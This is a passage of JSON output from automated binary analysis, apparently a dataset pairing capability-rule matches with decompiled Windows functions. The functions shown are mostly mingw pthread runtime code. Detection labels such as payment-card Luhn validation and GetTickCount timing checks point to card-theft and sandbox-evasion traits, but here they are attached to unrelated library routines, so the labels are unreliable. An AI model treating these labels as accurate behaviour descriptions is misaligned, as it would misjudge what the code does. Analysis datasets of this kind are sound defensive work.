            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14000aec0(ulong arg1, ulong arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg3);\n    iVar1 = *arg4;\n    if (0x7fffffff < iVar1 + arg2) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n        return 0x22;\n    }\n    LOCK();\n    *arg4 = *arg4 + arg2;\n    if (iVar1 < 0) {\n        iVar2 = -iVar1;\n        if (arg2 < -iVar1) {\n            iVar2 = arg2;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(arg1, iVar2, 0);\n        if (iVar1 == 0) {\n            LOCK();\n            *arg4 = *arg4 - arg2;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n            return 0x16;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n    return 0;\n}\n",
        "token_count": 259
    },
    "14000c81": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.14000c810(int64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    \n    if (((arg1 != NULL) && (*arg1 != 0)) && (arg2 - *arg1 != arg3)) {\n        iVar1 = sub.msvcrt.dll_realloc();\n        if (iVar1 != 0) {\n            *arg1 = iVar1;\n        }\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "14000150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140001500(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll__onexit();\n    return -(iVar1 == 0);\n}\n",
        "token_count": 44
    },
    "14000186": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140001865(int64_t arg1, char *arg2, ulong noname_2, ulong arg4)\n\n{\n    int64_t var_10h;\n    char *var_18h;\n    \n    var_10h = arg1;\n    for (var_18h = arg2; *var_18h != '\\0'; var_18h = var_18h + 2) {\n        fcn.140001540(var_18h, \"%02X\", var_10h, arg4);\n        var_10h = var_10h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 137
    },
    "14000241": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140002410(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x14001b120);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x14001b100; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x000140002474. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x14001b120);\n    return;\n}\n",
        "token_count": 244
    },
    "1400027a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400027a0(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    \n    if (((**0x140018320 == 0x5a4d) && (piVar3 = *(*0x140018320 + 0x1e) + *0x140018320,  *piVar3 == 0x4550)) &&\n       (*(piVar3 + 6) == 0x20b)) {\n        iVar2 = piVar3 + *(piVar3 + 5) + 0x18;\n        if (*(piVar3 + 6) != 0) {\n            iVar1 = iVar2 + 0x28;\n            do {\n                if ((*(iVar2 + 0xc) <= arg1 - *0x140018320) && (arg1 - *0x140018320 < *(iVar2 + 0xc) + *(iVar2 + 8))) {\n                    return iVar2;\n                }\n                iVar2 = iVar2 + 0x28;\n            } while (iVar2 != iVar1 + (*(piVar3 + 6) - 1) * 0x28);\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 283
    },
    "14000282": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort fcn.140002820(void)\n\n{\n    int32_t *piVar1;\n    \n    if (((**0x140018320 == 0x5a4d) && (piVar1 = *0x140018320 + *(*0x140018320 + 0x1e),  *piVar1 == 0x4550)) &&\n       (*(piVar1 + 6) == 0x20b)) {\n        return *(piVar1 + 6);\n    }\n    return 0;\n}\n",
        "token_count": 113
    },
    "1400028d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.1400028d0(void)\n\n{\n    int16_t *piVar1;\n    \n    if ((**0x140018320 == 0x5a4d) && (*(*(*0x140018320 + 0x1e) + *0x140018320) == 0x4550)) {\n        piVar1 = NULL;\n        if (*(*(*0x140018320 + 0x1e) + *0x140018320 + 6) == 0x20b) {\n            piVar1 = *0x140018320;\n        }\n        return piVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 146
    },
    "14000738": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140007380(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140004ca0();\n    if (iVar1 != 0) {\n        iVar1 = *(iVar1 + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 64
    },
    "1400073c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.1400073c0(void)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = fcn.140004ca0();\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x18;\n    }\n    return iVar1;\n}\n",
        "token_count": 65
    },
    "14000770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140007700(ulong arg1)\n\n{\n    int64_t iVar1;\n    int32_t *piVar2;\n    \n    iVar1 = fcn.140004ca0();\n    if (iVar1 != 0) {\n        piVar2 = iVar1 + 0x20;\n        if (arg1 < 1) {\n            LOCK();\n            *piVar2 = *piVar2 + -1;\n            return;\n        }\n        LOCK();\n        *piVar2 = *piVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "1400079d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400079d0(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    arg1 = arg1 & 0xffffffff;\n    iVar1 = fcn.140004ca0();\n    if (arg1 != 0) {\n        fcn.140007840();\n        if (*(iVar1 + 0x30) == 0) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(arg1);\n        }\n        else {\n            fcn.140009420(*(iVar1 + 0x30), arg1);\n        }\n        fcn.140007840();\n        return 0;\n    }\n    fcn.140007840();\n    (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    fcn.140007840();\n    return 0;\n}\n",
        "token_count": 174
    },
    "140008e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140008e40(ulong arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ulong auStack32 [2];\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_FormatMessageA)(0x1100, 0, iVar2, 0x400, auStack32, 0, 0);\n        pcVar1 = _sym.imp.KERNEL32.dll_OutputDebugStringA;\n        if (iVar2 != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringA)(auStack32[0]);\n            (*pcVar1)(arg1);\n            (*_sym.imp.KERNEL32.dll_LocalFree)(auStack32[0]);\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n        if (iVar2 != 0) {\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "14000931": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140009310(void)\n\n{\n    uint32_t uStack16;\n    uint32_t uStack12;\n    \n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&uStack16);\n    return ((uStack12 << 0x20) + uStack16 + 0xfe624e212ac18000) / 10000;\n}\n",
        "token_count": 84
    },
    "14000957": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.140009570(uint64_t *arg1, uint64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    puVar3 = sub.msvcrt.dll_malloc(0x18);\n    if (puVar3 != NULL) {\n        *puVar3 = 0;\n        uVar2 = 2;\n        if (arg2 != 0xfffffffffffffffd) {\n            uVar2 = arg2 == 0xfffffffffffffffe;\n        }\n        puVar3[1] = uVar2;\n        *(puVar3 + 2) = 0;\n        puVar3[4] = 0;\n        puVar3[5] = 0xffffffff;\n        LOCK();\n        uVar1 = *arg1;\n        *arg1 = *arg1 ^ (arg2 == uVar1) * (*arg1 ^ puVar3);\n        if (arg2 != uVar1) {\n            sub.msvcrt.dll_free(puVar3);\n            puVar3 = *arg1;\n        }\n    }\n    return puVar3;\n}\n",
        "token_count": 248
    },
    "14000a15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.14000a150(ulong *arg1)\n\n{\n    uint *arg1_00;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    if (arg1 == NULL) {\n        iVar1 = 0x16;\n    }\n    else {\n        *arg1 = 0;\n        puVar2 = sub.msvcrt.dll_calloc(1);\n        if (puVar2 == NULL) {\n            iVar1 = 0xc;\n        }\n        else {\n            *puVar2 = 0xdeadb0ef;\n            arg1_00 = puVar2 + 6;\n            *(puVar2 + 2) = 0;\n            puVar2[4] = 0;\n            iVar1 = fcn.140009a90(arg1_00, 0);\n            if (iVar1 == 0) {\n                iVar1 = fcn.140009a90(puVar2 + 8, 0);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.14000b1e0(puVar2 + 10, 0);\n                    if (iVar1 == 0) {\n                        *puVar2 = 0xbab1f0ed;\n                        *arg1 = puVar2;\n                        return 0;\n                    }\n                    fcn.140009ae0(arg1_00);\n                    fcn.140009ae0(puVar2 + 8);\n                    sub.msvcrt.dll_free(puVar2);\n                    return iVar1;\n                }\n                fcn.140009ae0(arg1_00);\n            }\n            sub.msvcrt.dll_free(puVar2);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 372
    },
    "14000a6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14000a6e0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    ulong unaff_RBX;\n    uint uVar12;\n    \n    uVar12 = unaff_RBX >> 0x20;\n    uVar10 = fcn.14000a3c0(arg1);\n    if (uVar10 != 0) {\n        return uVar10;\n    }\n    piVar1 = *arg1;\n    piVar7 = piVar1 + 6;\n    uVar5 = fcn.1400095f0(piVar7);\n    if (uVar5 == 0) {\n        LOCK();\n        piVar1[3] = piVar1[3] + 1;\n        if (piVar1[3] != 0x7fffffff) {\n            uVar5 = fcn.140009910(piVar7);\n            goto code_r0x00014000a73a;\n        }\n        uVar5 = fcn.1400095f0(piVar1 + 8);\n        uVar10 = uVar5;\n        if (uVar5 == 0) {\n            piVar1[3] = piVar1[3] - piVar1[4];\n            piVar1[4] = 0;\n            uVar5 = fcn.140009910(piVar1 + 8);\n            uVar6 = fcn.140009910(piVar7);\n            if (uVar5 == 0) {\n                uVar5 = uVar6;\n            }\n            uVar10 = uVar5;\n        }\n        else {\n            fcn.140009910(piVar7);\n        }\n    }\n    else {\ncode_r0x00014000a73a:\n        uVar10 = uVar5;\n    }\n    piVar2 = *0x1400183a0;\n    iVar9 = **0x1400183a0;\n    if (iVar9 == 0) {\n        iVar8 = fcn.140008fc0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) == 0) goto code_r0x000140009f1b;\n        if (iVar9 == 0) {\n            iVar9 = fcn.140008fc0();\n        }\ncode_r0x000140009fa8:\n        uVar11 = *(iVar9 + 0xa0);\n    }\n    else {\n        if (*(iVar9 + 0xa0) != 0) goto code_r0x000140009fa8;\ncode_r0x000140009f1b:\n        uVar11 = 0x140016098;\n        *(iVar9 + 0xa0) = 0x140016098;\n    }\n    fcn.14000ae70(uVar11);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        uVar11 = (**0x140016110)(2);\n        sub.msvcrt.dll_fprintf\n                  (uVar11, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\", \n                   CONCAT44(uVar12, 0x2e));\n        iVar9 = 1;\n        sub.msvcrt.dll_exit();\n        *(iVar9 + 0xc) = -*(iVar9 + 0x10);\n        *(iVar9 + 0x10) = 0;\n        fcn.140009910(iVar9 + 0x20);\n        piVar7 = *(iVar9 + 0x18);\n        if (piVar7 + 3U < 4) {\n            piVar7 = fcn.140009570(iVar9 + 0x18, piVar7);\n        }\n        if (piVar7 == NULL) {\n            return 0xc;\n        }\n        if (piVar7[1] != 0) {\n            if (*piVar7 == 0) {\n                return 0x16;\n            }\n            iVar4 = piVar7[5];\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != iVar3) {\n                return 1;\n            }\n            if (piVar7[4] != 0) {\n                piVar7[4] = piVar7[4] + -1;\n                return 0;\n            }\n            piVar7[5] = -1;\n        }\n        iVar4 = *piVar7;\n        *piVar7 = 0;\n        uVar10 = 0;\n        if (iVar4 == 2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar7 + 2));\n            uVar10 = iVar4 == 0;\n        }\n        return uVar10;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar9 = *piVar2;\n    if (iVar9 == 0) {\n        iVar8 = fcn.140008fc0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) != 0) {\n            if (iVar9 == 0) {\n                iVar9 = fcn.140008fc0();\n            }\n            goto code_r0x000140009fe0;\n        }\n    }\n    else if (*(iVar9 + 0xa0) != 0) {\ncode_r0x000140009fe0:\n        uVar11 = *(iVar9 + 0xa0);\n        goto code_r0x000140009f72;\n    }\n    uVar11 = 0x140016098;\n    *(iVar9 + 0xa0) = 0x140016098;\ncode_r0x000140009f72:\n    fcn.14000aeb0(uVar11);\n    return uVar10;\n}\n",
        "token_count": 1416
    },
    "14000aa5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14000aa50(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    ulong uVar11;\n    \n    uVar10 = fcn.140009dc0(arg1);\n    if (uVar10 != 0) {\n        return uVar10;\n    }\n    piVar1 = *arg1;\n    piVar7 = piVar1 + 8;\n    if (piVar1[2] == 0) {\n        uVar5 = fcn.1400095f0(piVar7);\n        uVar10 = uVar5;\n        if (uVar5 == 0) {\n            LOCK();\n            piVar1[4] = piVar1[4] + 1;\n            if (piVar1[4] == 0) {\n                uVar5 = fcn.14000ba50(piVar1 + 10);\n                uVar6 = fcn.140009910(piVar7);\n                if (uVar5 == 0) {\n                    uVar5 = uVar6;\n                }\n                uVar10 = uVar5;\n            }\n            else {\n                uVar5 = fcn.140009910(piVar7);\n                uVar10 = uVar5;\n            }\n        }\n    }\n    else {\n        LOCK();\n        piVar1[2] = piVar1[2] + -1;\n        uVar5 = fcn.140009910(piVar7);\n        uVar10 = uVar5;\n        uVar6 = fcn.140009910(piVar1 + 6);\n        if (uVar5 == 0) {\n            uVar10 = uVar6;\n        }\n    }\n    piVar2 = *0x1400183a0;\n    iVar9 = **0x1400183a0;\n    if (iVar9 == 0) {\n        iVar8 = fcn.140008fc0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) == 0) goto code_r0x000140009f1b;\n        if (iVar9 == 0) {\n            iVar9 = fcn.140008fc0();\n        }\ncode_r0x000140009fa8:\n        uVar11 = *(iVar9 + 0xa0);\n    }\n    else {\n        if (*(iVar9 + 0xa0) != 0) goto code_r0x000140009fa8;\ncode_r0x000140009f1b:\n        uVar11 = 0x140016098;\n        *(iVar9 + 0xa0) = 0x140016098;\n    }\n    fcn.14000ae70(uVar11);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        uVar11 = (**0x140016110)(2);\n        sub.msvcrt.dll_fprintf\n                  (uVar11, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\", 0x2e);\n        iVar9 = 1;\n        sub.msvcrt.dll_exit();\n        *(iVar9 + 0xc) = -*(iVar9 + 0x10);\n        *(iVar9 + 0x10) = 0;\n        fcn.140009910(iVar9 + 0x20);\n        piVar7 = *(iVar9 + 0x18);\n        if (piVar7 + 3U < 4) {\n            piVar7 = fcn.140009570(iVar9 + 0x18, piVar7);\n        }\n        if (piVar7 == NULL) {\n            return 0xc;\n        }\n        if (piVar7[1] != 0) {\n            if (*piVar7 == 0) {\n                return 0x16;\n            }\n            iVar4 = piVar7[5];\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != iVar3) {\n                return 1;\n            }\n            if (piVar7[4] != 0) {\n                piVar7[4] = piVar7[4] + -1;\n                return 0;\n            }\n            piVar7[5] = -1;\n        }\n        iVar4 = *piVar7;\n        *piVar7 = 0;\n        uVar10 = 0;\n        if (iVar4 == 2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar7 + 2));\n            uVar10 = iVar4 == 0;\n        }\n        return uVar10;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar9 = *piVar2;\n    if (iVar9 == 0) {\n        iVar8 = fcn.140008fc0();\n        iVar9 = *piVar2;\n        if (*(iVar8 + 0xa0) != 0) {\n            if (iVar9 == 0) {\n                iVar9 = fcn.140008fc0();\n            }\n            goto code_r0x000140009fe0;\n        }\n    }\n    else if (*(iVar9 + 0xa0) != 0) {\ncode_r0x000140009fe0:\n        uVar11 = *(iVar9 + 0xa0);\n        goto code_r0x000140009f72;\n    }\n    uVar11 = 0x140016098;\n    *(iVar9 + 0xa0) = 0x140016098;\ncode_r0x000140009f72:\n    fcn.14000aeb0(uVar11);\n    return uVar10;\n}\n",
        "token_count": 1375
    },
    "14000ab1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.14000ab10(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    ulong *puVar9;\n    int64_t *piVar10;\n    ulong uVar11;\n    int32_t *piStack88;\n    int32_t **ppiStack80;\n    ulong uStack72;\n    \n    uVar8 = fcn.14000a3c0(arg1);\n    if (uVar8 != 0) {\n        return uVar8;\n    }\n    piVar5 = *arg1;\n    uVar3 = fcn.1400095f0(piVar5 + 6);\n    uVar8 = uVar3;\n    if (uVar3 == 0) {\n        uVar3 = fcn.1400095f0(piVar5 + 8);\n        uVar8 = uVar3;\n        if (uVar3 == 0) {\n            if (piVar5[2] == 0) {\n                iVar4 = piVar5[3];\n                if (0 < piVar5[4]) {\n                    iVar4 = iVar4 - piVar5[4];\n                    piVar5[4] = 0;\n                    piVar5[3] = iVar4;\n                }\n                if (0 < iVar4) {\n                    piVar5[4] = -iVar4;\n                    piStack88 = 0x14000a030;\n                    ppiStack80 = piVar5;\n                    puVar9 = fcn.1400073c0();\n                    uStack72 = *puVar9;\n                    piVar10 = fcn.1400073c0();\n                    *piVar10 = &piStack88;\n                    do {\n                        uVar3 = fcn.14000bce0(piVar5 + 10, piVar5 + 8);\n                        if (uVar3 != 0) {\n                            puVar9 = fcn.1400073c0();\n                            uVar8 = uVar3;\n                            *puVar9 = uStack72;\n                            (*piStack88)(ppiStack80);\n                            goto code_r0x000140009ef0;\n                        }\n                    } while (piVar5[4] < 0);\n                    puVar9 = fcn.1400073c0();\n                    *puVar9 = uStack72;\n                    piVar5[3] = 0;\n                }\n            }\n            LOCK();\n            piVar5[2] = piVar5[2] + 1;\n        }\n        else {\n            fcn.140009910(piVar5 + 6);\n        }\n    }\ncode_r0x000140009ef0:\n    piVar10 = *0x1400183a0;\n    iVar7 = **0x1400183a0;\n    if (iVar7 == 0) {\n        ppiStack80 = 0x140009f8d;\n        iVar6 = fcn.140008fc0();\n        iVar7 = *piVar10;\n        if (*(iVar6 + 0xa0) == 0) goto code_r0x000140009f1b;\n        if (iVar7 == 0) {\n            ppiStack80 = 0x140009fa4;\n            iVar7 = fcn.140008fc0();\n        }\ncode_r0x000140009fa8:\n        uVar11 = *(iVar7 + 0xa0);\n    }\n    else {\n        if (*(iVar7 + 0xa0) != 0) goto code_r0x000140009fa8;\ncode_r0x000140009f1b:\n        uVar11 = 0x140016098;\n        *(iVar7 + 0xa0) = 0x140016098;\n    }\n    ppiStack80 = 0x140009f2e;\n    fcn.14000ae70(uVar11);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        ppiStack80 = 0x140009ff4;\n        uVar11 = (**0x140016110)(2);\n        ppiStack80 = 0x14000a019;\n        sub.msvcrt.dll_fprintf\n                  (uVar11, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\");\n        iVar7 = 1;\n        ppiStack80 = 0x14000a023;\n        sub.msvcrt.dll_exit();\n        *(iVar7 + 0xc) = -*(iVar7 + 0x10);\n        *(iVar7 + 0x10) = 0;\n        ppiStack80 = arg1;\n        fcn.140009910(iVar7 + 0x20);\n        piVar5 = *(iVar7 + 0x18);\n        piVar1 = piStack88;\n        if (piVar5 + 3U < 4) {\n            piVar5 = fcn.140009570(iVar7 + 0x18, piVar5);\n            piVar1 = piStack88;\n        }\n        piStack88 = piVar5;\n        if (piStack88 == NULL) {\n            return 0xc;\n        }\n        piVar5 = piStack88;\n        if (piStack88[1] != 0) {\n            if (*piStack88 == 0) {\n                return 0x16;\n            }\n            iVar4 = piStack88[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != iVar2) {\n                return 1;\n            }\n            if (piStack88[4] != 0) {\n                piStack88[4] = piStack88[4] + -1;\n                return 0;\n            }\n            piStack88[5] = -1;\n            piVar5 = piStack88;\n            piVar1 = piStack88;\n        }\n        piStack88 = piVar1;\n        iVar4 = *piVar5;\n        *piVar5 = 0;\n        uVar8 = 0;\n        if (iVar4 == 2) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar5 + 2));\n            uVar8 = iVar4 == 0;\n        }\n        return uVar8;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar7 = *piVar10;\n    if (iVar7 == 0) {\n        ppiStack80 = 0x140009fbd;\n        iVar6 = fcn.140008fc0();\n        iVar7 = *piVar10;\n        if (*(iVar6 + 0xa0) != 0) {\n            if (iVar7 == 0) {\n                ppiStack80 = 0x140009fd7;\n                iVar7 = fcn.140008fc0();\n            }\n            goto code_r0x000140009fe0;\n        }\n    }\n    else if (*(iVar7 + 0xa0) != 0) {\ncode_r0x000140009fe0:\n        uVar11 = *(iVar7 + 0xa0);\n        goto code_r0x000140009f72;\n    }\n    uVar11 = 0x140016098;\n    *(iVar7 + 0xa0) = 0x140016098;\ncode_r0x000140009f72:\n    ppiStack80 = 0x140009f77;\n    fcn.14000aeb0(uVar11);\n    return uVar8;\n}\n",
        "token_count": 1759
    },
    "14000b76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.14000b760(ulong arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t *in_stack_00000028;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg4);\n    LOCK();\n    *in_stack_00000028 = *in_stack_00000028 + -1;\n    pcVar3 = _sym.imp.KERNEL32.dll_LeaveCriticalSection;\n    iVar4 = 0;\n    iVar1 = *in_stack_00000028;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg4);\n    if (iVar1 < 0) {\n        iVar4 = fcn.14000b450(arg1, arg2 & 0xffffffff, arg3 & 0xffffffff);\n        (*pcVar2)(arg4);\n        if (iVar4 != 0) {\n            LOCK();\n            *in_stack_00000028 = *in_stack_00000028 + 1;\n        }\n        (*pcVar3)(arg4);\n    }\n    return iVar4;\n}\n",
        "token_count": 277
    },
    "14000c62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.14000c620(void)\n\n{\n    (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    return 0;\n}\n",
        "token_count": 32
    },
    "14001034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140010340(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong auStackX24 [2];\n    ulong uStack16;\n    \n    uStack16 = 0x14001034b;\n    iVar1 = fcn.140002a60(param_1);\n    iVar1 = -iVar1;\n    puVar3 = &stack0x00000018 + iVar1;\n    for (iVar2 = 0x203; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *(&stack0x00000018 + iVar1) = param_1;\n    (&stack0x00001020)[iVar1] = 1;\n    *(&stack0xfffffffffffffff0 + iVar1) = 0x140010378;\n    fcn.14000cb00(&stack0x00000018 + iVar1, param_2, param_3);\n    return;\n}\n",
        "token_count": 249
    },
    "140010de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140010de0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    iVar1 = *(arg1 + 0x14);\n    piVar3 = arg1 + 0x18;\n    do {\n        if (*piVar3 != 0) {\n            *piVar3 = *piVar3 + -1;\n            return;\n        }\n        piVar2 = piVar3 + 1;\n        *piVar3 = -1;\n        piVar3 = piVar2;\n    } while (piVar2 < arg1 + 0x18 + iVar1);\n    return;\n}\n",
        "token_count": 154
    },
    "14001367": {
        "rules": [
